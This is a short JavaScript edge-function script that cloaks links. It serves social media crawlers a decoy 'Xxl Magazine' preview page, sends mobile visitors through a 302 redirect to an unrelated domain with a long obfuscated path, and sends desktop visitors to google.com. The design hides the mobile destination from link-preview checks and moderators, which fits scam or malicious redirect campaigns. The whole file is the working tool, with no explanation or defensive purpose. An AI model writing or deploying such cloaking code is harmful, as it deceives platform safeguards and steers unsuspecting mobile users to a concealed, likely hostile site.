export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="Xxl Magazine">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://s3.us-east-2.amazonaws.com/img-utils-conversions.pixelied.com/conversions/Tue-Sep-08-2026/ad9d6a5a-0e4f-4530-8e14-0086ee59f798/31845872-a8ee-4651-9715-e46b1cb8c78e.avif">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://racialburgerdiverse.com/dS29JqD/B7znf77/wQ6omTrppMaIJ6f/F8yQtsycESAL8Q/ORweFfE2X4/SeMxtgTv5/7fI/_oOIYDP8dloWrrrv/-xVhS/usR/F7nbTgJkNVR/2KNM2i4t_9iaixAdt/K4x820orBcVQ", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
